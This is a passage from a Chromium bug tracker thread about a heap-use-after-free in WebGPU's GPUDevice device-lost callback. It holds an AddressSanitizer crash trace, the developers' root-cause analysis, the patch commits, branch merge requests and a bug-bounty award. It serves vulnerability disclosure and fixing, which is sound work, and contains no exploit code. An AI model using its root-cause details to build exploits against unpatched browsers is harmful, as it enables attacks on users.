    #13 0x7ffd661277ca in blink::ContainerNode::RemoveChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:736:3
    #14 0x7ffd663c8f2a in blink::Node::removeChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\src\third_party\blink\renderer\core\dom\node.cc:742:23
    #15 0x7ffd6a30d064 in blink::`anonymous namespace'::v8_node::RemoveChildOperationCallback C:\src\chromium\src\out\Asan\gen\third_party\blink\renderer\bindings\core\v8\v8_node.cc:954:23
    #16 0x7ffd75368956 in v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo) C:\src\chromium\src\v8\src\api\api-arguments-inl.h:152:3
    #17 0x7ffd753637a9 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\src\chromium\src\v8\src\builtins\builtins-api.cc:112:36
    #18 0x7ffd7535e157 in v8::internal::Builtin_Impl_HandleApiCall C:\src\chromium\src\v8\src\builtins\builtins-api.cc:142:5
    #19 0x7ffd7535d031 in v8::internal::Builtin_HandleApiCall(int, unsigned __int64 *, class v8::internal::Isolate *) C:\src\chromium\src\v8\src\builtins\builtins-api.cc:130:1
    #20 0x7e96000d029b  (<unknown module>)

previously allocated by thread T0 here:
    #0 0x7ffda815dd8b  (C:\src\chromium\src\out\Asan\clang_rt.asan_dynamic-x86_64.dll+0x18003dd8b)
    #1 0x7ffd61a528a9 in blink::CreateDawnCallback<class base::OnceCallback<(char const *)>>(class base::OnceCallback<(char const *)>) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h:87:10
    #2 0x7ffd61a4939b in blink::GPUDevice::GPUDevice(class blink::ExecutionContext *, class scoped_refptr<class blink::DawnControlClientHolder>, class blink::GPUAdapter *, struct WGPUDeviceImpl *, class blink::GPUDeviceDescriptor const *) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc:77:22
    #3 0x7ffd61a2bcde in cppgc::MakeGarbageCollectedTrait<class blink::GPUDevice>::Call<class blink::ExecutionContext *&, class scoped_refptr<class blink::DawnControlClientHolder> const &, class blink::GPUAdapter *, struct WGPUDeviceImpl *&, class blink::GPUDeviceDescriptor const *&>(class cppgc::AllocationHandle &, class blink::ExecutionContext *&, class scoped_refptr<class blink::DawnControlClientHolder> const &, class blink::GPUAdapter *&&, struct WGPUDeviceImpl *&, class blink::GPUDeviceDescriptor const *&) C:\src\chromium\src\v8\include\cppgc\allocation.h:174:32
    #4 0x7ffd61a285c9 in blink::GPUAdapter::OnRequestDeviceCallback(class blink::ScriptState *, class blink::ScriptPromiseResolver *, class blink::GPUDeviceDescriptor const *, struct WGPUDeviceImpl *) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_adapter.cc:107:20
    #5 0x7ffd61a2d359 in base::internal::Invoker<struct base::internal::BindState<void (__cdecl blink::GPUAdapter::*)(class blink::ScriptState *, class blink::ScriptPromiseResolver *, class blink::GPUDeviceDescriptor const *, struct WGPUDeviceImpl *), class cppgc::internal::BasicPersistent<class blink::GPUAdapter, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::ScriptState, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::ScriptPromiseResolver, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::GPUDeviceDescriptor, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>>, (struct WGPUDeviceImpl *)>::RunOnce(class base::internal::BindStateBase *, struct WGPUDeviceImpl *) C:\src\chromium\src\base\bind_internal.h:690:12
    #6 0x7ffd61a2dd96 in base::OnceCallback<(struct WGPUDeviceImpl *)>::Run(struct WGPUDeviceImpl *) && C:\src\chromium\src\base\callback.h:99:12
    #7 0x7ffd61a2d27f in WTF::ThreadCheckingCallbackWrapper<class base::OnceCallback<(struct WGPUDeviceImpl *)>, (struct WGPUDeviceImpl *)>::Run(struct WGPUDeviceImpl *) C:\src\chromium\src\third_party\blink\renderer\platform\wtf\functional.h:210:12
    #8 0x7ffd494eede4 in base::internal::Invoker<base::internal::BindState<`lambda at ../../gpu/command_buffer/client/webgpu_implementation.cc:586:7',scoped_refptr<gpu::webgpu::DawnWireServices>,dawn_wire::ReservedDevice,base::OnceCallback<void (WGPUDeviceImpl *)> >,void (bool)>::RunOnce C:\src\chromium\src\base\bind_internal.h:690:12
    #9 0x7ffd494e5a07 in gpu::webgpu::WebGPUImplementation::OnGpuControlReturnData(class base::span<unsigned char const, -1>) C:\src\chromium\src\gpu\command_buffer\client\webgpu_implementation.cc:445:27
    #10 0x7ffd8c0fb9b1 in gpu::CommandBufferProxyImpl::OnReturnData(class std::__1::vector<unsigned char, class std::__1::allocator<unsigned char>> const &) C:\src\chromium\src\gpu\ipc\client\command_buffer_proxy_impl.cc:615:26
    #11 0x7ffd8c1be3a3 in gpu::mojom::CommandBufferClientStubDispatch::Accept(class gpu::mojom::CommandBufferClient *, class mojo::Message *) C:\src\chromium\src\out\Asan\gen\gpu\ipc\common\gpu_channel.mojom.cc:6488:13
    #12 0x7ffdb98c4bc1 in mojo::InterfaceEndpointClient::HandleValidatedMessage(class mojo::Message *) C:\src\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:898:54
    #13 0x7ffdb98d951b in mojo::MessageDispatcher::Accept(class mojo::Message *) C:\src\chromium\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43:19
    #14 0x7ffdb98c976c in mojo::InterfaceEndpointClient::HandleIncomingMessage(class mojo::Message *) C:\src\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:655:20
    #15 0x7ffdb430ab4c in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread C:\src\chromium\src\ipc\ipc_mojo_bootstrap.cc:981:24
    #16 0x7ffdb4301df0 in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\src\chromium\src\base\bind_internal.h:690:12
    #17 0x7ffda8cf7dbe in base::TaskAnnotator::RunTask(char const *, struct base::PendingTask *) C:\src\chromium\src\base\task\common\task_annotator.cc:178:33
    #18 0x7ffda8d6e743 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *) C:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:360:23
    #19 0x7ffda8d6d11d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:260:36
    #20 0x7ffda8b5ebb8 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\src\chromium\src\base\message_loop\message_pump_default.cc:39:55
    #21 0x7ffda8d70b0d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class base::TimeDelta) C:\src\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:467:12
    #22 0x7ffda8c365d5 in base::RunLoop::Run(class base::Location const &) C:\src\chromium\src\base\run_loop.cc:134:14
    #23 0x7ffd9024fb0a in content::RendererMain(struct content::MainFunctionParams const &) C:\src\chromium\src\content\renderer\renderer_main.cc:265:16
    #24 0x7ffd90795ba8 in content::ContentMainRunnerImpl::Run(bool) C:\src\chromium\src\content\app\content_main_runner_impl.cc:973:10
    #25 0x7ffd90791eba in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\src\chromium\src\content\app\content_main.cc:390
    #26 0x7ffd90792ef9 in content::ContentMain(struct content::ContentMainParams const &) C:\src\chromium\src\content\app\content_main.cc:418
    #27 0x7ffd943214bd in ChromeMain C:\src\chromium\src\chrome\app\chrome_main.cc:172:12

SUMMARY: AddressSanitizer: heap-use-after-free C:\src\chromium\src\base\callback_internal.cc:85:29 in base::internal::CallbackBase::~CallbackBase(void)
Shadow bytes around the buggy address:
  0x044891b66a70: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fa
  0x044891b66a80: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa
  0x044891b66a90: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd
  0x044891b66aa0: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa
  0x044891b66ab0: fa fa fd fd fa fa fd fa fa fa 00 fa fa fa 00 fa
=>0x044891b66ac0: fa fa[fd]fa fa fa fd fd fa fa fd fa fa fa fd fd
  0x044891b66ad0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd
  0x044891b66ae0: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd
  0x044891b66af0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fa
  0x044891b66b00: fa fa 00 00 fa fa fd fd fa fa fd fa fa fa fd fd
  0x044891b66b10: fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==51568==ABORTING

### en...@chromium.org (2021-08-26)

[Empty comment from Monorail migration]

### kb...@chromium.org (2021-08-26)

[Empty comment from Monorail migration]

### kb...@chromium.org (2021-08-26)

[Empty comment from Monorail migration]

### en...@chromium.org (2021-08-27)

Had a VC about this with kbr@ and junov@. Thanks for the help diagnosing this issue!

In addition to setting callbacks to null as done in Shrek's CL, we also need to change the device lost callback to a repeating callback (even though we only expect it to be called once).

There are two failure modes:
 - In the first, the ~GPUDevice finalizer runs before the lost C callback is called. This scenario is solved by setting the callbacks to null in the finalizer. Doing so will prevent the lost C callback from firing.
 - In the second failure mode, the lost C callback is called before ~GPUDevice. It acquires the once-callback unique_ptr and destroys itself after it finishes. But, because the page is in an about-to-be-finalized state, and we created the callback with WrapWeakPersistent, the unbound callback does NOT forward to GPUDevice::OnDeviceLostError. OnDeviceLostError is the function which would have released ownership of the lost_callback_ unique_ptr. Since it is never called, when finalization in ~GPUDevice happens later, we double free the lost_callback_ unique_ptr. This scenario is solved by changing the lost_callback_ to be a repeating callback (does not self-delete). This simplifies the lifetime management so that the callback is cleaned up strictly in one place: finalization of GPUDevice. We don't have the issue where the callback deletes itself and GPUDevice fails to release ownership.

Scenario 2 can be thought of as if there are two owners to the unique_ptr lost_callback_. The callback acquires self-ownership when it is called, and the GPUDevice also has ownership. The GPUDevice releases its ownership when the callback is called. But, sometimes this ownership handoff doesn't happen because of WrapWeakPersistent. The solution is to remove the need for any ownership transfer.

### en...@chromium.org (2021-08-27)

[Empty comment from Monorail migration]

### en...@chromium.org (2021-08-27)

Started in https://chromium-review.googlesource.com/c/chromium/src/+/3123966

### cw...@chromium.org (2021-08-27)

That's a great explanation! Maybe we should prevent using BindDawnCallback with WrapWeakPersistent through compile-time checks. It seems the same failure mode will appear for every BindDawnCallback(WrapWeakPersistent).

### gi...@appspot.gserviceaccount.com (2021-08-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/412b407353a9801468abd04ff43be6e3783a9e0d

commit 412b407353a9801468abd04ff43be6e3783a9e0d
Author: Austin Eng <enga@chromium.org>
Date: Fri Aug 27 22:15:12 2021

Fix use-after-free errors with ~GPUDevice and device lost handling

Depending on the ordering of ExecutionContext ContextDestroyed
and GC of GPUDevice during page finalization, there can be
use-after-free errors where GPUDevice::lost_callback_ is called after
it has been deleted, or where lost_callback_ is freed twice.

These issues are fixed by setting the C callbacks to null on
~GPUDevice to prevent them from being called after finalization,
and by changing the ownership of lost_callback_ to be a repeating
callback. Repeating callbacks do not self-delete after they are called,
so the only owner of this callback is the GPUDevice.

Further, this CL changes creation of these callbacks so that they can
be used strictly as either repeating callbacks or once callbacks,
making it harder to use them incorrectly.

Lastly, the CL adds a gpu_context_lost regression test which is a stress
test to reproduce the problem discovered in the bug.

Bug: 1242269
Change-Id: Idbad5ba638d221bf1a4b86151e827846cabf4e9f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3123966
Commit-Queue: Austin Eng <enga@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Commit-Position: refs/heads/main@{#916135}

[add] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/content/test/data/gpu/webgpu-stress-request-device-and-remove-loop.html
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/content/test/gpu/gpu_tests/context_lost_integration_test.py
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/dawn_callback.h
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/gpu_buffer.cc
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/gpu_device.cc
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/gpu_device.h
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/gpu_queue.cc
[modify] https://crrev.com/412b407353a9801468abd04ff43be6e3783a9e0d/third_party/blink/renderer/modules/webgpu/gpu_shader_module.cc


### en...@chromium.org (2021-08-27)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-28)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-28)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-28)

This bug requires manual review: M94's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), harrysouders@(iOS), matthewjoseph@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### en...@chromium.org (2021-08-30)

1. Does your merge fit within the Merge Decision Guidelines?
Yes, it is a non-functional use-after-free fix for a security issue.

2. Links to the CLs you are requesting to merge.
https://chromium-review.googlesource.com/c/chromium/src/+/3128606

3. Has the change landed and been verified on ToT?
Yes, landed 3 days ago and is in Canary 95.0.4626.0
https://chromiumdash.appspot.com/commit/412b407353a9801468abd04ff43be6e3783a9e0d

4. Does this change need to be merged into other active release branches (M-1, M+1)?
No, the WebGPU API started finch in M94

5. Why are these changes required in this milestone after branch?
This is a use-after-free security issue.

6. Is this a new feature?
No

7. If it is a new feature, is it behind a flag using finch?
Not a new feature

### sr...@google.com (2021-08-30)

Merge approved for M94 branch:4606 please merge asap

### gi...@appspot.gserviceaccount.com (2021-08-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/db180784a4d3a704ca12f4475b35149d6af5174c

commit db180784a4d3a704ca12f4475b35149d6af5174c
Author: Austin Eng <enga@chromium.org>
Date: Mon Aug 30 18:11:13 2021

Fix use-after-free errors with ~GPUDevice and device lost handling

Depending on the ordering of ExecutionContext ContextDestroyed
and GC of GPUDevice during page finalization, there can be
use-after-free errors where GPUDevice::lost_callback_ is called after
it has been deleted, or where lost_callback_ is freed twice.

These issues are fixed by setting the C callbacks to null on
~GPUDevice to prevent them from being called after finalization,
and by changing the ownership of lost_callback_ to be a repeating
callback. Repeating callbacks do not self-delete after they are called,
so the only owner of this callback is the GPUDevice.

Further, this CL changes creation of these callbacks so that they can
be used strictly as either repeating callbacks or once callbacks,
making it harder to use them incorrectly.

Lastly, the CL adds a gpu_context_lost regression test which is a stress
test to reproduce the problem discovered in the bug.

(cherry picked from commit 412b407353a9801468abd04ff43be6e3783a9e0d)

Bug: 1242269
Change-Id: Idbad5ba638d221bf1a4b86151e827846cabf4e9f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3123966
Commit-Queue: Austin Eng <enga@chromium.org>
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#916135}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3128606
Commit-Queue: Kenneth Russell <kbr@chromium.org>
Auto-Submit: Austin Eng <enga@chromium.org>
Cr-Commit-Position: refs/branch-heads/4606@{#506}
Cr-Branched-From: 35b0d5a9dc8362adfd44e2614f0d5b7402ef63d0-refs/heads/master@{#911515}

[add] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/content/test/data/gpu/webgpu-stress-request-device-and-remove-loop.html
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/content/test/gpu/gpu_tests/context_lost_integration_test.py
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/dawn_callback.h
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/gpu_buffer.cc
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/gpu_device.cc
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/gpu_device.h
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/gpu_queue.cc
[modify] https://crrev.com/db180784a4d3a704ca12f4475b35149d6af5174c/third_party/blink/renderer/modules/webgpu/gpu_shader_module.cc


### en...@chromium.org (2021-08-30)

loobenyang@gmail.com, thank you for filing this bug report with a simple repro case and diagnosis of the issue!

### gi...@appspot.gserviceaccount.com (2021-08-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2f591523e5db5010b06b52cc1cdc72c1c233aec1

commit 2f591523e5db5010b06b52cc1cdc72c1c233aec1
Author: Austin Eng <enga@chromium.org>
Date: Tue Aug 31 14:57:06 2021

Move dawn_callback.h to third_party/blink/renderer/platform/graphics/gpu

Follow-up CL to add static_asserts that DawnOnceCallback is not used to
bind weak methods. Using these base::internal:: helpers requires
dawn_callback.h to be in third_party/blink/renderer/platform/graphics/gpu

Bug: 1242269
Change-Id: I8b90d0b2db617559414a181be13f820657eab7cd
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3130002
Reviewed-by: Kenneth Russell <kbr@chromium.org>
Commit-Queue: Austin Eng <enga@chromium.org>
Cr-Commit-Position: refs/heads/main@{#916802}

[modify] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/modules/webgpu/BUILD.gn
[modify] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/modules/webgpu/gpu_buffer.cc
[modify] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/modules/webgpu/gpu_device.h
[modify] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/modules/webgpu/gpu_shader_module.cc
[modify] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/platform/BUILD.gn
[rename] https://crrev.com/2f591523e5db5010b06b52cc1cdc72c1c233aec1/third_party/blink/renderer/platform/graphics/gpu/dawn_callback.h


### am...@google.com (2021-09-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-09-01)

Congratulations, Looben Yang on another one! The VRP Panel has decided to award you $7500 for this report. Thank you for another high-quality report and nice work! 

### am...@google.com (2021-09-02)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-09-20)

[Empty comment from Monorail migration]

### am...@google.com (2021-09-21)

[Empty comment from Monorail migration]

### rz...@google.com (2021-09-23)

[Empty comment from Monorail migration]

### cw...@chromium.org (2021-09-23)

WebGPU started Origin Trial in M94 so we don't need to merge to M90.

### rz...@google.com (2021-09-29)

[Empty comment from Monorail migration]

### cw...@chromium.org (2021-09-29)

WebGPU Origin Trial starts at M94 so we don't need to merge to M90

### rz...@google.com (2021-09-29)

[Empty comment from Monorail migration]

### gi...@google.com (2021-09-30)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-10-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f93276bd4ef5280180d4b342fb40c1d0b1adef89

commit f93276bd4ef5280180d4b342fb40c1d0b1adef89
Author: Austin Eng <enga@chromium.org>
Date: Thu Oct 07 16:33:12 2021

[M90-LTS] Fix use-after-free errors with ~GPUDevice and device lost handling

Depending on the ordering of ExecutionContext ContextDestroyed
and GC of GPUDevice during page finalization, there can be
use-after-free errors where GPUDevice::lost_callback_ is called after
it has been deleted, or where lost_callback_ is freed twice.

These issues are fixed by setting the C callbacks to null on
~GPUDevice to prevent them from being called after finalization,
and by changing the ownership of lost_callback_ to be a repeating
callback. Repeating callbacks do not self-delete after they are called,
so the only owner of this callback is the GPUDevice.

Further, this CL changes creation of these callbacks so that they can
be used strictly as either repeating callbacks or once callbacks,
making it harder to use them incorrectly.

Lastly, the CL adds a gpu_context_lost regression test which is a stress
test to reproduce the problem discovered in the bug.

M90 merge issues:
  Some members not present on m90:
  - GPUDevice::logging_callback_, GPUDevice::limits_
  - GPUQueue::OnWorkDoneCallback
  - GPUShaderModule::OnCompilationInfoCallback
  - GPUShaderModule::compilationInfo
  BindDawnCallback renamed to BindDawnOnceCallback, additional change
  needed on gpu_fence.cc
  _WaitForTabAndCheckCompletion called with unexpected argument (timeout=120000)

(cherry picked from commit 412b407353a9801468abd04ff43be6e3783a9e0d)

Bug: 1242269
Change-Id: Idbad5ba638d221bf1a4b86151e827846cabf4e9f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3123966
Commit-Queue: Austin Eng <enga@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#916135}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3172883
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/4430@{#1640}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/third_party/blink/renderer/modules/webgpu/gpu_buffer.cc
[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/third_party/blink/renderer/modules/webgpu/gpu_device.cc
[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/third_party/blink/renderer/modules/webgpu/gpu_fence.cc
[add] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/content/test/data/gpu/webgpu-stress-request-device-and-remove-loop.html
[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/third_party/blink/renderer/modules/webgpu/dawn_callback.h
[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/content/test/gpu/gpu_tests/context_lost_integration_test.py
[modify] https://crrev.com/f93276bd4ef5280180d4b342fb40c1d0b1adef89/third_party/blink/renderer/modules/webgpu/gpu_device.h


### rz...@google.com (2021-10-08)

[Empty comment from Monorail migration]

### am...@google.com (2021-10-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1242269?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocked-on: crbug.com/dawn/1092]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056969)*
